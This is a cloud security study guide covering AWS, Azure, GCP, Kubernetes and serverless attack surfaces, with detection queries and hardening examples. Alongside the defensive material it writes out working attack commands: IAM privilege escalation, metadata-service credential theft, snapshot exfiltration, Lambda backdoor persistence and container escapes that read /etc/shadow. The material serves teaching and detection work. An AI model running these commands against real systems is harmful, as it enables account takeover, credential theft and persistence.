# 11 - Cloud Security
## AWS, Azure, GCP, Containers, Kubernetes, Serverless, Cloud Forensics

---

## Cloud Shared Responsibility Model

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SHARED RESPONSIBILITY                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│ IaaS (EC2, VMs)          │ PaaS (RDS, App Service)  │ SaaS (O365, Salesforce)│
├──────────────────────────┼──────────────────────────┼────────────────────────┤
│ Customer Responsible:    │ Customer Responsible:    │ Customer Responsible:  │
│ ├── Data                 │ ├── Data                 │ ├── Data               │
│ ├── Applications         │ ├── Applications         │ ├── Access Control     │
│ ├── OS/Runtime           │ ├── Access Control       │ └── Configuration      │
│ ├── Network Config       │ └── Some Network Config  │                        │
│ ├── Access Control       │                          │                        │
│ └── Encryption           │                          │                        │
├──────────────────────────┴──────────────────────────┴────────────────────────┤
│ Cloud Provider Responsible: Physical, Network, Hypervisor, Foundation       │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## AWS Security Deep Dive

### IAM Security

```
IAM COMPONENTS:
├── Users: Human identities
├── Groups: Collections of users
├── Roles: Assumed identities (preferred for services)
├── Policies: Permission documents (JSON)
├── Identity Providers: Federation (SAML, OIDC)
└── Service Control Policies (SCPs): Organization-level guardrails

POLICY EVALUATION LOGIC:
1. Explicit Deny → DENY
2. SCP Check (if in Organization)
3. Resource-based Policy
4. Identity-based Policy
5. IAM Permissions Boundary
6. Session Policy
7. Default → DENY

DANGEROUS IAM PERMISSIONS:
┌─────────────────────────────────────┬─────────────────────────────────────┐
│ Permission                          │ Risk / Abuse                        │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ iam:*                               │ Full IAM control                    │
│ iam:PassRole                        │ Pass high-privilege role to service │
│ iam:CreatePolicyVersion             │ Escalate via new policy version     │
│ iam:SetDefaultPolicyVersion         │ Activate malicious policy version   │
│ iam:AttachUserPolicy                │ Attach admin policy to self         │
│ iam:AttachGroupPolicy               │ Escalate group permissions          │
│ iam:AttachRolePolicy                │ Add permissions to role             │
│ iam:PutUserPolicy                   │ Inline policy injection             │
│ iam:PutGroupPolicy                  │ Inline policy injection             │
│ iam:PutRolePolicy                   │ Inline policy injection             │
│ iam:CreateAccessKey                 │ Create keys for any user            │
│ iam:CreateLoginProfile              │ Create console password for user    │
│ iam:UpdateLoginProfile              │ Change user's console password      │
│ iam:UpdateAssumeRolePolicy          │ Allow role assumption by attacker   │
│ sts:AssumeRole (*)                  │ Assume any role                     │
│ sts:GetFederationToken              │ Create federated credentials        │
│ lambda:CreateFunction + iam:PassRole│ Create Lambda with admin role       │
│ lambda:UpdateFunctionCode           │ Inject code into existing function  │
│ lambda:InvokeFunction               │ Execute function (data access)      │
│ ec2:RunInstances + iam:PassRole     │ Launch instance with admin role     │
│ glue:CreateDevEndpoint + iam:PassRole│ Create endpoint with admin role   │
│ glue:UpdateDevEndpoint              │ Modify endpoint to add SSH key      │
│ cloudformation:* + iam:PassRole     │ Deploy stack with any role          │
│ datapipeline:CreatePipeline         │ Create pipeline with role           │
│ ssm:StartSession                    │ Shell access to EC2 instances       │
│ ssm:SendCommand                     │ Execute commands on instances       │
│ codestar:CreateProject              │ Create project with admin role      │
│ sagemaker:CreateNotebookInstance    │ Create notebook with role           │
│ codebuild:CreateProject             │ Create build project with role      │
└─────────────────────────────────────┴─────────────────────────────────────┘

PRIVILEGE ESCALATION TECHNIQUES:

# 1. Create new policy version
aws iam create-policy-version \
    --policy-arn arn:aws:iam::ACCOUNT:policy/TARGET \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
    --set-as-default

# 2. Attach admin policy to user
aws iam attach-user-policy \
    --user-name TARGET-USER \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. Create access key for another user
aws iam create-access-key --user-name TARGET-USER

# 4. Update assume role policy
aws iam update-assume-role-policy \
    --role-name ADMIN-ROLE \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/ATTACKER"},"Action":"sts:AssumeRole"}]}'

# 5. Create Lambda with admin role
aws lambda create-function \
    --function-name Backdoor \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT:role/ADMIN-ROLE \
    --handler index.handler \
    --zip-file fileb://backdoor.zip

# 6. Pass role to EC2
aws ec2 run-instances \
    --image-id ami-xxx \
    --instance-type t3.micro \
    --iam-instance-profile Name=ADMIN-PROFILE

DETECTION:
index=cloudtrail
| where eventName IN ("CreatePolicyVersion", "AttachUserPolicy",
    "AttachRolePolicy", "PutUserPolicy", "PutRolePolicy",
    "CreateAccessKey", "UpdateAssumeRolePolicy", "CreateFunction",
    "UpdateFunctionCode")
| stats count by userIdentity.arn, eventName, eventTime
| sort - eventTime
```

### CloudTrail Analysis

```
CLOUDTRAIL LOG STRUCTURE:
{
    "eventTime": "2026-02-24T10:00:00Z",
    "eventSource": "iam.amazonaws.com",
    "eventName": "CreateAccessKey",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "203.0.113.1",
    "userAgent": "aws-cli/2.x",
    "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDA...",
        "arn": "arn:aws:iam::123456789012:user/attacker",
        "accountId": "123456789012",
        "userName": "attacker"
    },
    "requestParameters": {
        "userName": "victim"
    },
    "responseElements": {
        "accessKey": {
            "accessKeyId": "AKIA...",
            "status": "Active"
        }
    }
}

CRITICAL EVENTS TO MONITOR:
┌─────────────────────────────────────┬─────────────────────────────────────┐
│ Event                               │ Security Significance               │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ ConsoleLogin                        │ User logins (check MFA)             │
│ ConsoleLogin (Failure)              │ Brute force attempts                │
│ CreateUser                          │ New identity creation               │
│ CreateAccessKey                     │ Programmatic access creation        │
│ DeleteAccessKey                     │ Evidence destruction                │
│ AttachUserPolicy/PutUserPolicy      │ Permission escalation               │
│ AttachRolePolicy/PutRolePolicy      │ Role escalation                     │
│ AssumeRole                          │ Role assumption (cross-account)     │
│ GetSessionToken                     │ Temporary credentials               │
│ GetFederationToken                  │ Federated access                    │
│ StopLogging                         │ CloudTrail disabled (critical!)     │
│ DeleteTrail                         │ Audit log deletion                  │
│ UpdateTrail                         │ Trail modification                  │
│ PutEventSelectors                   │ Selective logging                   │
│ CreateNetworkAclEntry               │ Network ACL changes                 │
│ AuthorizeSecurityGroupIngress       │ Security group opened               │
│ AuthorizeSecurityGroupEgress        │ Outbound rules changed              │
│ CreateSecurityGroup                 │ New security group                  │
│ ModifyInstanceAttribute             │ Instance modification               │
│ ModifyImageAttribute                │ AMI sharing                         │
│ RunInstances                        │ New instance launch                 │
│ CreateSnapshot                      │ Data exfiltration prep              │
│ ModifySnapshotAttribute             │ Snapshot sharing (exfil)            │
│ CreateKeyPair/ImportKeyPair         │ SSH key for persistence             │
│ GetSecretValue                      │ Secrets Manager access              │
│ GetParameter (SecureString)         │ SSM Parameter Store access          │
│ PutBucketPolicy                     │ S3 policy change                    │
│ PutBucketAcl                        │ S3 ACL change                       │
│ PutObjectAcl                        │ Object-level ACL change             │
│ CreateDBSnapshot                    │ RDS snapshot (exfil)                │
│ ModifyDBCluster                     │ Database modification               │
│ StartQueryExecution (Athena)        │ Data access via Athena              │
│ Decrypt (KMS)                       │ Encryption key usage                │
│ DisableKey (KMS)                    │ Disable encryption key              │
│ ScheduleKeyDeletion (KMS)           │ Delete encryption key               │
└─────────────────────────────────────┴─────────────────────────────────────┘

ATHENA QUERIES FOR CLOUDTRAIL:

-- Root account usage
SELECT eventTime, eventName, sourceIPAddress, userAgent
FROM cloudtrail_logs
WHERE userIdentity.type = 'Root'
  AND eventTime > date_add('day', -7, current_timestamp)
ORDER BY eventTime DESC;

-- Console logins without MFA
SELECT eventTime, userIdentity.arn, sourceIPAddress,
       responseElements.ConsoleLogin
FROM cloudtrail_logs
WHERE eventName = 'ConsoleLogin'
  AND additionalEventData LIKE '%"MFAUsed":"No"%'
ORDER BY eventTime DESC;

-- Cross-account role assumptions
SELECT eventTime, userIdentity.arn, requestParameters.roleArn,
       sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'AssumeRole'
  AND userIdentity.accountId != '123456789012'  -- Your account
ORDER BY eventTime DESC;

-- IAM privilege escalation attempts
SELECT eventTime, userIdentity.arn, eventName,
       requestParameters, errorCode
FROM cloudtrail_logs
WHERE eventName IN ('CreatePolicyVersion', 'AttachUserPolicy',
    'AttachRolePolicy', 'PutUserPolicy', 'CreateAccessKey',
    'UpdateAssumeRolePolicy')
ORDER BY eventTime DESC;

-- CloudTrail tampering
SELECT eventTime, userIdentity.arn, eventName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventName IN ('StopLogging', 'DeleteTrail', 'UpdateTrail',
    'PutEventSelectors')
ORDER BY eventTime DESC;

-- Unusual regions
SELECT awsRegion, COUNT(*) as event_count,
       ARRAY_AGG(DISTINCT eventName) as events
FROM cloudtrail_logs
WHERE awsRegion NOT IN ('us-east-1', 'us-west-2')  -- Normal regions
  AND eventTime > date_add('day', -1, current_timestamp)
GROUP BY awsRegion
HAVING COUNT(*) > 10;

-- Data exfiltration indicators
SELECT eventTime, userIdentity.arn, eventName,
       requestParameters.bucketName
FROM cloudtrail_logs
WHERE eventName IN ('CreateSnapshot', 'ModifySnapshotAttribute',
    'CopySnapshot', 'CreateDBSnapshot', 'CopyDBSnapshot',
    'ModifyDBSnapshotAttribute')
ORDER BY eventTime DESC;
```

### S3 Security

```
S3 SECURITY CONTROLS:
├── Bucket Policies (resource-based)
├── ACLs (legacy, avoid)
├── Block Public Access (account + bucket level)
├── Object Lock (WORM compliance)
├── Versioning
├── Server-Side Encryption (SSE-S3, SSE-KMS, SSE-C)
├── Access Points
├── VPC Endpoints (gateway + interface)
└── Access Logging

COMMON MISCONFIGURATIONS:
├── Public bucket policy
├── Public ACL (AllUsers, AuthenticatedUsers)
├── Block Public Access disabled
├── Overly permissive cross-account access
├── Disabled encryption
├── Disabled versioning
├── No access logging
└── Exposed via static website hosting

DETECTION COMMANDS:
# Check bucket ACL
aws s3api get-bucket-acl --bucket BUCKET

# Check bucket policy
aws s3api get-bucket-policy --bucket BUCKET

# Check public access block
aws s3api get-public-access-block --bucket BUCKET

# Check encryption
aws s3api get-bucket-encryption --bucket BUCKET

# List all public buckets
for bucket in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
    policy=$(aws s3api get-bucket-policy-status --bucket $bucket 2>/dev/null)
    if echo $policy | grep -q '"IsPublic": true'; then
        echo "PUBLIC: $bucket"
    fi
done

S3 DATA EVENTS (CloudTrail):
index=cloudtrail eventSource="s3.amazonaws.com"
| where eventName IN ("GetObject", "PutObject", "DeleteObject")
| stats count sum(requestParameters.bytes) as total_bytes by
    userIdentity.arn, requestParameters.bucketName
| where total_bytes > 1000000000  /* > 1GB */

S3 BUCKET POLICY - LEAST PRIVILEGE:
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenyInsecureConnections",
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::bucket-name",
                "arn:aws:s3:::bucket-name/*"
            ],
            "Condition": {
                "Bool": {"aws:SecureTransport": "false"}
            }
        },
        {
            "Sid": "DenyIncorrectEncryption",
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:PutObject",
            "Resource": "arn:aws:s3:::bucket-name/*",
            "Condition": {
                "StringNotEquals": {
                    "s3:x-amz-server-side-encryption": "aws:kms"
                }
            }
        }
    ]
}
```

### EC2 Security

```
EC2 ATTACK VECTORS:
├── IMDS (Instance Metadata Service)
├── User data scripts (credentials)
├── IAM role abuse
├── Security group misconfig
├── EBS snapshot exposure
├── AMI poisoning
└── SSH key compromise

IMDS ATTACKS (169.254.169.254):
# IMDSv1 (vulnerable to SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/

FORCE IMDSv2:
aws ec2 modify-instance-metadata-options \
    --instance-id i-xxx \
    --http-tokens required \
    --http-endpoint enabled

USER DATA SECRETS:
# Retrieve user data (base64 encoded)
curl http://169.254.169.254/latest/user-data | base64 -d

# Search for credentials
grep -E "(AWS_ACCESS_KEY|AWS_SECRET|password|api_key)" user-data.txt

EC2 SECURITY GROUP AUDIT:
# Find security groups with 0.0.0.0/0 ingress
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].[GroupId,GroupName,IpPermissions]'

# Find SSH open to internet
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" "Name=ip-permission.to-port,Values=22" "Name=ip-permission.cidr,Values=0.0.0.0/0"

# Find RDP open to internet
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=3389" "Name=ip-permission.to-port,Values=3389" "Name=ip-permission.cidr,Values=0.0.0.0/0"

EBS SNAPSHOT EXPOSURE:
# Check for public snapshots
aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[?not_null(CreateVolumePermissions[?Group==`all`])]'

# Snapshot exfiltration
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --user-ids ATTACKER-ACCOUNT

DETECTION:
index=cloudtrail eventSource="ec2.amazonaws.com"
| where eventName IN ("ModifyInstanceMetadataOptions",
    "ModifySnapshotAttribute", "ModifyImageAttribute",
    "AuthorizeSecurityGroupIngress")
| stats count by userIdentity.arn, eventName, requestParameters
```

---

## Azure Security Deep Dive

### Azure AD / Entra ID

```
AZURE AD COMPONENTS:
├── Tenant: Organization container
├── Users: Human identities
├── Groups: Collections (Security, M365, Dynamic)
├── Applications: Registered apps with permissions
├── Service Principals: App identities
├── Managed Identities: Auto-managed service identities
├── Conditional Access: Policy-based access control
├── PIM: Privileged Identity Management
└── Administrative Units: Delegation boundaries

HIGH-PRIVILEGE ROLES:
┌───────────────────────────────────┬─────────────────────────────────────┐
│ Role                              │ Risk Level                          │
├───────────────────────────────────┼─────────────────────────────────────┤
│ Global Administrator              │ CRITICAL - Full tenant control      │
│ Privileged Role Administrator     │ CRITICAL - Can assign GA            │
│ Privileged Authentication Admin   │ CRITICAL - Reset any password       │
│ Partner Tier2 Support             │ CRITICAL - Reset GA passwords       │
│ Application Administrator         │ HIGH - App credential access        │
│ Cloud Application Administrator   │ HIGH - App management               │
│ Authentication Administrator      │ HIGH - Reset non-admin passwords    │
│ Helpdesk Administrator            │ HIGH - Reset non-admin passwords    │
│ User Administrator                │ HIGH - User management              │
│ Groups Administrator              │ MEDIUM - Group management           │
│ Directory Synchronization Accounts│ MEDIUM - AD Connect sync            │
│ Hybrid Identity Administrator     │ MEDIUM - Identity sync              │
└───────────────────────────────────┴─────────────────────────────────────┘

ATTACK VECTORS:
├── Password Spray
├── Consent Phishing (malicious OAuth apps)
├── Token Theft (Primary Refresh Token)
├── Device Code Phishing
├── Golden SAML
├── Azure AD Connect Abuse
├── Application Secret Extraction
├── Managed Identity Abuse
└── PRT Cookie Theft

CONSENT PHISHING DETECTION:
AuditLogs
| where OperationName == "Consent to application"
| where Result == "success"
| extend AppId = tostring(TargetResources[0].id)
| extend ConsentedBy = tostring(InitiatedBy.user.userPrincipalName)
| extend Permissions = tostring(AdditionalDetails)
| project TimeGenerated, ConsentedBy, AppId, Permissions

# Risky OAuth permissions
Mail.Read, Mail.ReadWrite, Mail.Send
Files.Read.All, Files.ReadWrite.All
User.Read.All, Directory.Read.All
Application.ReadWrite.All
RoleManagement.ReadWrite.Directory

AZURE AD SIGN-IN LOGS:
SigninLogs
| where ResultType != 0  // Failed
| summarize FailureCount=count() by UserPrincipalName, IPAddress,
    bin(TimeGenerated, 1h)
| where FailureCount > 10

// Impossible travel
SigninLogs
| where ResultType == 0
| summarize by UserPrincipalName, Location, TimeGenerated
| order by UserPrincipalName, TimeGenerated
| extend PrevLocation = prev(Location), PrevTime = prev(TimeGenerated)
| where UserPrincipalName == prev(UserPrincipalName)
| extend TimeDiff = datetime_diff('minute', TimeGenerated, PrevTime)
| where Location != PrevLocation and TimeDiff < 60

// Token theft indicators
SigninLogs
| where AuthenticationRequirement == "singleFactorAuthentication"
| where TokenIssuerType == "AzureAD"
| where RiskLevel in ("high", "medium")
| project TimeGenerated, UserPrincipalName, IPAddress, Location,
    RiskLevel, RiskDetail
```

### Azure Resource Security

```
AZURE RBAC:
├── Owner: Full access + delegation
├── Contributor: Full access, no delegation
├── Reader: Read-only
├── User Access Administrator: Manage access only
└── Custom Roles: Granular permissions

DANGEROUS PERMISSIONS:
Microsoft.Authorization/roleAssignments/write
Microsoft.Authorization/roleDefinitions/write
Microsoft.Compute/virtualMachines/extensions/write
Microsoft.Compute/virtualMachines/runCommand/action
Microsoft.KeyVault/vaults/secrets/getSecret/action
Microsoft.Storage/storageAccounts/listKeys/action
Microsoft.Web/sites/config/list/action
Microsoft.Sql/servers/databases/vulnerabilityAssessmentScans/action

AZURE ACTIVITY LOG ANALYSIS:
AzureActivity
| where OperationNameValue contains "ROLEASSIGNMENTS/WRITE"
| project TimeGenerated, Caller, OperationNameValue,
    Properties_d.requestbody
| order by TimeGenerated desc

// Resource group deletion
AzureActivity
| where OperationNameValue == "MICROSOFT.RESOURCES/SUBSCRIPTIONS/RESOURCEGROUPS/DELETE"
| project TimeGenerated, Caller, ResourceGroup

// Key Vault access
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where OperationName == "SecretGet" or OperationName == "SecretList"
| project TimeGenerated, CallerIPAddress, identity_claim_upn_s,
    id_s, OperationName

// Storage account key access
AzureActivity
| where OperationNameValue == "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION"
| project TimeGenerated, Caller, Resource

MANAGED IDENTITY ABUSE:
# Get token from VM
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Detection
AzureActivity
| where Claims_d.["http://schemas.microsoft.com/identity/claims/objectidentifier"] != ""
| where Claims_d.idtyp == "app"
| summarize count() by Caller, OperationNameValue
```

---

## GCP Security Deep Dive

### IAM & Service Accounts

```
GCP IAM MODEL:
├── Organization (org-level policies)
├── Folders (grouping projects)
├── Projects (resource containers)
└── Resources (actual resources)

PREDEFINED ROLES (Dangerous):
roles/owner
roles/editor
roles/iam.securityAdmin
roles/iam.serviceAccountAdmin
roles/iam.serviceAccountKeyAdmin
roles/compute.admin
roles/storage.admin
roles/bigquery.admin
roles/cloudfunctions.admin
roles/cloudsql.admin

SERVICE ACCOUNT ABUSE:
# List service accounts
gcloud iam service-accounts list

# List keys (should have minimal external keys)
gcloud iam service-accounts keys list \
    --iam-account=SA@PROJECT.iam.gserviceaccount.com

# Create key (attacker action)
gcloud iam service-accounts keys create key.json \
    --iam-account=SA@PROJECT.iam.gserviceaccount.com

# Impersonate service account
gcloud auth activate-service-account SA@PROJECT.iam.gserviceaccount.com \
    --key-file=key.json

# Generate access token
gcloud auth print-access-token

GCP METADATA SERVICE:
# Requires header
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/"

# Get access token
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get service account email
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

GCP AUDIT LOGS:
# Admin Activity (always on)
# Data Access (must enable per service)
# System Events
# Policy Denied

resource.type="gce_instance"
protoPayload.methodName="v1.compute.instances.setMetadata"

resource.type="iam_service_account"
protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"

resource.type="bigquery_dataset"
protoPayload.methodName="google.cloud.bigquery.v2.TableDataService.List"
```

---

## Kubernetes Security Deep Dive

### K8s Attack Surface

```
KUBERNETES COMPONENTS:
├── Control Plane
│   ├── kube-apiserver (API gateway)
│   ├── etcd (cluster state store)
│   ├── kube-scheduler (pod placement)
│   ├── kube-controller-manager (cluster controllers)
│   └── cloud-controller-manager (cloud integration)
└── Worker Nodes
    ├── kubelet (node agent)
    ├── kube-proxy (network proxy)
    └── Container Runtime (containerd, CRI-O)

ATTACK VECTORS:
┌─────────────────────────────────────┬─────────────────────────────────────┐
│ Vector                              │ Risk                                │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Exposed API server (6443)           │ Cluster takeover                    │
│ Anonymous auth enabled              │ Unauthenticated access              │
│ Kubelet API (10250) exposed         │ Node command execution              │
│ etcd exposed (2379)                 │ Cluster secrets extraction          │
│ Dashboard without auth              │ Full cluster control                │
│ Privileged containers               │ Container escape to node            │
│ hostPID/hostNetwork/hostIPC         │ Host namespace access               │
│ Mounted service account tokens      │ API access from compromised pod     │
│ Writable hostPath mounts            │ Node filesystem modification        │
│ Docker socket mounted               │ Container escape                    │
│ Weak RBAC                           │ Privilege escalation                │
│ Vulnerable admission controllers    │ Policy bypass                       │
│ Insecure pod security policies      │ Dangerous pods deployed             │
│ Network policy gaps                 │ Lateral movement                    │
│ Image vulnerabilities               │ Initial compromise                  │
│ Secrets in environment variables    │ Secret exposure                     │
│ Unencrypted etcd                    │ Secret extraction                   │
└─────────────────────────────────────┴─────────────────────────────────────┘

CONTAINER ESCAPE TECHNIQUES:

# If privileged container
mount /dev/sda1 /mnt
chroot /mnt
# Now on host filesystem

# If hostPID
nsenter -t 1 -m -u -i -n /bin/bash
# Shell as PID 1 (init)

# If docker socket mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
# Root on host

# If CAP_SYS_ADMIN
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "cat /etc/shadow > $host_path/shadow" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# Host /etc/shadow now accessible

DETECTION:
index=k8s verb="create" resource IN ("pods", "deployments")
| spath "requestObject.spec.containers{}.securityContext"
| where privileged=true OR allowPrivilegeEscalation=true
| stats count by user.username, requestObject.metadata.name
```

### K8s RBAC

```
RBAC COMPONENTS:
├── ServiceAccount: Identity for pods
├── Role: Namespace-scoped permissions
├── ClusterRole: Cluster-wide permissions
├── RoleBinding: Binds Role to subject in namespace
└── ClusterRoleBinding: Binds ClusterRole cluster-wide

DANGEROUS RBAC PERMISSIONS:
┌─────────────────────────────────────┬─────────────────────────────────────┐
│ Permission                          │ Abuse                               │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ * on secrets                        │ Read all secrets including tokens   │
│ create pods                         │ Create privileged pod, escape       │
│ create pods/exec                    │ Exec into any pod                   │
│ create deployments                  │ Deploy malicious workloads          │
│ patch/update pods                   │ Inject sidecar containers           │
│ create serviceaccounts              │ Create new identities               │
│ create secrets                      │ Store malicious data                │
│ bind/escalate roles                 │ Grant self more permissions         │
│ create/patch nodes                  │ Node manipulation                   │
│ create/patch clusterroles           │ Privilege escalation                │
│ impersonate users/groups            │ Act as another identity             │
│ list/watch secrets                  │ Enumerate all secrets               │
│ create persistentvolumes            │ Access host filesystem              │
└─────────────────────────────────────┴─────────────────────────────────────┘

RBAC ENUMERATION:
# Check current permissions
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i create clusterrolebindings

# Find privileged service accounts
kubectl get clusterrolebindings -o json | jq -r '
    .items[] |
    select(.roleRef.name=="cluster-admin") |
    .subjects[]? | "\(.kind): \(.name)"'

# Find service accounts with secrets access
kubectl auth can-i get secrets --as=system:serviceaccount:default:default

# List all roles with dangerous permissions
kubectl get clusterroles -o json | jq -r '
    .items[] |
    select(.rules[]?.resources[]? == "secrets") |
    select(.rules[]?.verbs[]? == "*" or .rules[]?.verbs[]? == "get") |
    .metadata.name'

LEAST PRIVILEGE ROLE EXAMPLE:
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app
  name: app-reader
rules:
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch"]
```

### K8s Audit Logging

```
AUDIT POLICY:
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log all requests to secrets at Metadata level
  - level: Metadata
    resources:
    - group: ""
      resources: ["secrets"]

  # Log pod exec at Request level
  - level: Request
    resources:
    - group: ""
      resources: ["pods/exec", "pods/attach"]

  # Log all requests at RequestResponse level for debugging
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["pods", "services", "deployments"]

AUDIT LOG ANALYSIS:
# Secret access
index=k8s_audit verb IN ("get", "list", "watch") objectRef.resource="secrets"
| stats count by user.username, objectRef.namespace, objectRef.name

# Pod exec
index=k8s_audit verb="create" objectRef.resource="pods" objectRef.subresource="exec"
| stats count by user.username, objectRef.namespace, objectRef.name

# Privileged pod creation
index=k8s_audit verb="create" objectRef.resource="pods"
| spath "requestObject.spec.containers{}.securityContext.privileged"
| where privileged=true

# RBAC changes
index=k8s_audit verb IN ("create", "update", "patch", "delete")
    objectRef.resource IN ("clusterroles", "clusterrolebindings", "roles", "rolebindings")
| stats count by verb, objectRef.resource, user.username

# Service account token creation
index=k8s_audit verb="create" objectRef.resource="serviceaccounts"
    objectRef.subresource="token"

KEY EVENTS TO MONITOR:
├── Secrets access (especially cluster-wide)
├── Pod exec/attach
├── Privileged pod creation
├── RBAC modifications
├── Service account creation
├── Namespace creation/deletion
├── Node modifications
├── Persistent volume creation
└── ConfigMap changes in kube-system
```

### K8s Network Policies

```
DEFAULT DENY ALL:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: app
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress

ALLOW SPECIFIC TRAFFIC:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-to-db
  namespace: app
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 5432

EGRESS RESTRICTION:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-egress
  namespace: app
spec:
  podSelector:
    matchLabels:
      app: frontend
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: app
    ports:
    - protocol: TCP
      port: 5432
  # Allow DNS
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
```

---

## Serverless Security

### AWS Lambda Security

```
LAMBDA ATTACK SURFACE:
├── Function code vulnerabilities
├── Overly permissive IAM roles
├── Environment variable secrets
├── Event source injection
├── Dependency vulnerabilities
├── Cold start timing attacks
├── Resource exhaustion (timeout, memory)
└── Logging sensitive data

LAMBDA EXECUTION ROLE ABUSE:
# If Lambda has overly permissive role
# Attacker can invoke function to perform actions

# Example: Lambda with S3 full access
import boto3
def handler(event, context):
    s3 = boto3.client('s3')
    # Exfiltrate data
    response = s3.list_buckets()
    for bucket in response['Buckets']:
        s3.download_file(bucket['Name'], 'secrets.txt', '/tmp/secrets.txt')
        # Send to attacker

ENVIRONMENT VARIABLE EXPOSURE:
# Lambda function can read its own env vars
# If secrets are stored there, compromise = exposure

# Detection: Monitor Lambda invocations
index=cloudtrail eventSource="lambda.amazonaws.com"
    eventName="Invoke"
| stats count by userIdentity.arn, requestParameters.functionName

LAMBDA PERSISTENCE:
# Create/update function with backdoor
aws lambda update-function-code --function-name TARGET \
    --zip-file fileb://backdoor.zip

# Add trigger for persistence
aws events put-rule --name "persistence-rule" \
    --schedule-expression "rate(5 minutes)"
aws events put-targets --rule "persistence-rule" \
    --targets "Id"="1","Arn"="arn:aws:lambda:region:account:function:backdoor"

DETECTION:
index=cloudtrail eventSource="lambda.amazonaws.com"
| where eventName IN ("CreateFunction", "UpdateFunctionCode",
    "UpdateFunctionConfiguration", "AddPermission", "CreateEventSourceMapping")
| stats count by userIdentity.arn, requestParameters.functionName

LAMBDA SECURITY BEST PRACTICES:
├── Least privilege IAM roles
├── Don't store secrets in env vars (use Secrets Manager)
├── Enable VPC if accessing private resources
├── Set appropriate timeout and memory limits
├── Enable X-Ray for tracing
├── Use Lambda layers for dependencies (scan layers)
├── Enable code signing
├── Use reserved concurrency to limit blast radius
└── Enable function URL authentication
```

### Azure Functions Security

```
AZURE FUNCTIONS ATTACK SURFACE:
├── HTTP trigger authentication bypass
├── Managed identity abuse
├── Application settings secrets
├── Binding injection
├── Dependency vulnerabilities
└── Premium plan VNet exposure

MANAGED IDENTITY ABUSE:
# Get token from function
import requests
identity_endpoint = os.environ.get('IDENTITY_ENDPOINT')
identity_header = os.environ.get('IDENTITY_HEADER')

response = requests.get(
    f"{identity_endpoint}?resource=https://management.azure.com/&api-version=2019-08-01",
    headers={"X-IDENTITY-HEADER": identity_header}
)
token = response.json()['access_token']

# Use token to access Azure resources

DETECTION (Azure):
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.WEB"
